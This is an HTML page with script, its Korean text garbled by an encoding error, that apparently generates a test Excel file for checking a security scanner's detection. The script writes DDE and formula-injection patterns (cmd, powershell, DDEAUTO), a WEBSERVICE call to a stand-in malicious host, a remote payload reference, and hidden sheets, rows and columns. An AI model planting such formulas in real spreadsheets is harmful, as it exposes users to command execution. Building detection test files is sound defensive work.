.<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ì•…ì„±ì½”ë“œ ì˜ì‹¬ í…ŒìŠ¤íŠ¸ ì—‘ì…€ íŒŒì¼ ìƒì„±ê¸°</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #d32f2f;
            text-align: center;
        }
        .warning {
            background-color: #ffebee;
            border: 2px solid #ef5350;
            border-radius: 4px;
            padding: 15px;
            margin: 20px 0;
            color: #c62828;
        }
        .features {
            background-color: #f5f5f5;
            padding: 20px;
            border-radius: 4px;
            margin: 20px 0;
        }
        .features h3 {
            color: #333;
            margin-top: 0;
        }
        .features ul {
            margin: 10px 0;
            padding-left: 25px;
        }
        .features li {
            margin: 5px 0;
        }
        button {
            background-color: #d32f2f;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            display: block;
            margin: 30px auto;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #b71c1c;
        }
        .result {
            margin-top: 20px;
            padding: 15px;
            background-color: #e8f5e9;
            border-radius: 4px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸš¨ ì•…ì„±ì½”ë“œ ì˜ì‹¬ í…ŒìŠ¤íŠ¸ ì—‘ì…€ íŒŒì¼ ìƒì„±ê¸°</h1>
        
        <div class="warning">
            <strong>âš ï¸ ê²½ê³ :</strong> ì´ ë„êµ¬ëŠ” ë³´ì•ˆ í…ŒìŠ¤íŠ¸ ëª©ì ìœ¼ë¡œë§Œ ì‚¬ìš©í•˜ì„¸ìš”. 
            ìƒì„±ëœ íŒŒì¼ì€ ì‹¤ì œë¡œ ìœ„í—˜í•˜ì§€ ì•Šì§€ë§Œ, ë³´ì•ˆ ì†Œí”„íŠ¸ì›¨ì–´ì—ì„œ ì•…ì„±ì½”ë“œë¡œ ê°ì§€ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
        </div>
        
        <div class="features">
            <h3>ìƒì„±ë  íŒŒì¼ì— í¬í•¨ë˜ëŠ” ìœ„í—˜ ìš”ì†Œ:</h3>
            <ul>
                <li><strong>DDE ê³µê²© íŒ¨í„´:</strong> =cmd|, =DDE(), DDEAUTO ë“±ì˜ ìœ„í—˜í•œ ìˆ˜ì‹</li>
                <li><strong>ìœ„í—˜í•œ í•¨ìˆ˜:</strong> HYPERLINK (cmd.exe ë§í¬), WEBSERVICE</li>
                <li><strong>ì™¸ë¶€ ë§í¬:</strong> ì™¸ë¶€ íŒŒì¼ ë° ì›¹ì‚¬ì´íŠ¸ ì°¸ì¡°</li>
                <li><strong>ìˆ¨ê²¨ì§„ ì‹œíŠ¸:</strong> "Hidden_Data" ì‹œíŠ¸ (ë¯¼ê°í•œ ë°ì´í„° í¬í•¨)</li>
                <li><strong>ìˆ¨ê²¨ì§„ í–‰/ì—´:</strong> 10ë²ˆì§¸ í–‰ê³¼ Zì—´ì— ì•…ì„± ìˆ˜ì‹ ìˆ¨ê¹€</li>
                <li><strong>ìë™ ì‹¤í–‰ ì´ë¦„:</strong> Auto_Open, AutoExec ì •ì˜</li>
                <li><strong>ì˜ì‹¬ìŠ¤ëŸ¬ìš´ ë°ì´í„°:</strong> ê°€ì§œ ë¹„ë°€ë²ˆí˜¸ì™€ ì‹ ìš©ì¹´ë“œ ë²ˆí˜¸</li>
            </ul>
        </div>
        
        <button onclick="generateMaliciousExcel()">ì•…ì„±ì½”ë“œ ì˜ì‹¬ ì—‘ì…€ íŒŒì¼ ìƒì„±í•˜ê¸°</button>
        
        <div id="result" class="result">
            <h3>âœ… íŒŒì¼ ìƒì„± ì™„ë£Œ!</h3>
            <p>íŒŒì¼ëª…: <strong>malicious-test.xlsx</strong></p>
            <p>ì´ íŒŒì¼ì„ URL ë³´ì•ˆ ê²€ì‚¬ê¸°ì˜ íŒŒì¼ ìŠ¤ìº” ê¸°ëŠ¥ìœ¼ë¡œ í…ŒìŠ¤íŠ¸í•´ë³´ì„¸ìš”.</p>
        </div>
    </div>

    <script>
        function generateMaliciousExcel() {
            // ìƒˆ ì›Œí¬ë¶ ìƒì„±
            const workbook = XLSX.utils.book_new();

            // ë©”ì¸ ì‹œíŠ¸ ë°ì´í„° (ì •ìƒì ìœ¼ë¡œ ë³´ì´ëŠ” ë°ì´í„°)
            const mainData = [
                ['íšŒì‚¬ëª…', 'ë¶„ê¸°', 'ë§¤ì¶œ', 'ì´ìµ'],
                ['ABC Corp', '2024 Q1', 1000000, 250000],
                ['ABC Corp', '2024 Q2', 1200000, 300000],
                ['ABC Corp', '2024 Q3', 1100000, 280000],
                ['', '', '', ''],
                ['ì´ê³„', '', '=SUM(C2:C4)', '=SUM(D2:D4)']
            ];

            // ë©”ì¸ ì‹œíŠ¸ ìƒì„±
            const mainSheet = XLSX.utils.aoa_to_sheet(mainData);

            // DDE ê³µê²© íŒ¨í„´ ìˆ˜ì‹ ì¶”ê°€ (ìˆ¨ê²¨ì§„ ì…€ì—)
            mainSheet['Z100'] = { 
                f: '=cmd|"/c calc.exe"!A1',
                v: 0,
                t: 'n'
            };

            // ìœ„í—˜í•œ HYPERLINK í•¨ìˆ˜ ì¶”ê°€
            mainSheet['A10'] = {
                f: '=HYPERLINK("file:///c:/windows/system32/cmd.exe", "ì¤‘ìš” ë¬¸ì„œ ë‹¤ìš´ë¡œë“œ")',
                v: 'ì¤‘ìš” ë¬¸ì„œ ë‹¤ìš´ë¡œë“œ',
                t: 's'
            };

            // ì™¸ë¶€ íŒŒì¼ ì°¸ì¡° ì¶”ê°€
            mainSheet['B10'] = {
                f: '=[ì™¸ë¶€íŒŒì¼.xlsx]Sheet1!A1',
                v: '#REF!',
                t: 'e'
            };

            // WEBSERVICE í•¨ìˆ˜ (ì™¸ë¶€ ë°ì´í„° ì—°ê²°)
            mainSheet['C10'] = {
                f: '=WEBSERVICE("http://malicious-site.com/data")',
                v: '#VALUE!',
                t: 'e'
            };

            // ë©”ì¸ ì‹œíŠ¸ë¥¼ ì›Œí¬ë¶ì— ì¶”ê°€
            XLSX.utils.book_append_sheet(workbook, mainSheet, 'ë§¤ì¶œë³´ê³ ì„œ');

            // ìˆ¨ê²¨ì§„ ì‹œíŠ¸ ìƒì„± (ì•…ì„± ë°ì´í„° í¬í•¨)
            const hiddenData = [
                ['ìˆ¨ê²¨ì§„ ë°ì´í„°'],
                ['=DDE("cmd","/c powershell.exe","")'],
                ['=msexcel|\'\\\\evil-server\\payload.xls\'!\'Click Here\''],
                ['=cmd|" /C calc"!A0'],
                ['@SUM(cmd|" /c notepad"!A1)'],
                ['ì‚¬ìš©ì ë¹„ë°€ë²ˆí˜¸:', 'password123'],
                ['ì‹ ìš©ì¹´ë“œ:', '1234-5678-9012-3456']
            ];

            const hiddenSheet = XLSX.utils.aoa_to_sheet(hiddenData);

            // ë” ë§ì€ DDE íŒ¨í„´ ì¶”ê°€
            hiddenSheet['E1'] = {
                f: '=DDEAUTO("c:\\windows\\system32\\cmd.exe", "/c calc.exe")',
                v: 0,
                t: 'n'
            };

            // ì›Œí¬ë¶ì— ìˆ¨ê²¨ì§„ ì‹œíŠ¸ ì¶”ê°€
            XLSX.utils.book_append_sheet(workbook, hiddenSheet, 'Hidden_Data');

            // ë˜ ë‹¤ë¥¸ ì‹œíŠ¸ (ë§¤í¬ë¡œ ë²„íŠ¼ì²˜ëŸ¼ ë³´ì´ê²Œ)
            const macroData = [
                ['ë§¤í¬ë¡œ ì‹¤í–‰ ì‹œíŠ¸'],
                [''],
                ['ì•„ë˜ ë²„íŠ¼ì„ í´ë¦­í•˜ì—¬ ë³´ê³ ì„œë¥¼ ìƒì„±í•˜ì„¸ìš”:'],
                ['[ë³´ê³ ì„œ ìƒì„±]'],
                [''],
                ['Auto_Open ë§¤í¬ë¡œê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤']
            ];

            const macroSheet = XLSX.utils.aoa_to_sheet(macroData);
            XLSX.utils.book_append_sheet(workbook, macroSheet, 'Macros');

            // ì›Œí¬ë¶ ì†ì„± ì„¤ì • (ìˆ¨ê²¨ì§„ ì‹œíŠ¸ í‘œì‹œ)
            if (!workbook.Workbook) workbook.Workbook = {};
            if (!workbook.Workbook.Sheets) workbook.Workbook.Sheets = [];

            // Hidden_Data ì‹œíŠ¸ë¥¼ ìˆ¨ê¹€ ì²˜ë¦¬
            workbook.Workbook.Sheets[1] = { Hidden: 1 };

            // ì •ì˜ëœ ì´ë¦„ ì¶”ê°€ (ìë™ ì‹¤í–‰ ë§¤í¬ë¡œì²˜ëŸ¼ ë³´ì´ê²Œ)
            if (!workbook.Workbook.Names) workbook.Workbook.Names = [];
            workbook.Workbook.Names.push({
                Name: 'Auto_Open',
                Ref: 'Macros!$A$1'
            });
            workbook.Workbook.Names.push({
                Name: 'AutoExec',
                Ref: 'Hidden_Data!$A$1'
            });

            // í–‰/ì—´ ìˆ¨ê¸°ê¸° ì„¤ì •
            mainSheet['!rows'] = [
                null, null, null, null, null, null, null, null, null,
                { hidden: true }, // 10ë²ˆì§¸ í–‰ ìˆ¨ê¸°ê¸° (ìœ„í—˜í•œ í•¨ìˆ˜ë“¤ì´ ìˆëŠ” í–‰)
            ];

            mainSheet['!cols'] = [];
            for (let i = 0; i < 25; i++) {
                mainSheet['!cols'][i] = null;
            }
            mainSheet['!cols'][25] = { hidden: true }; // Zì—´ ìˆ¨ê¸°ê¸° (DDE ê³µê²© íŒ¨í„´ì´ ìˆëŠ” ì—´)

            // íŒŒì¼ ë‹¤ìš´ë¡œë“œ
            XLSX.writeFile(workbook, 'malicious-test.xlsx');

            // ê²°ê³¼ í‘œì‹œ
            document.getElementById('result').style.display = 'block';
        }
    </script>
</body>
</html>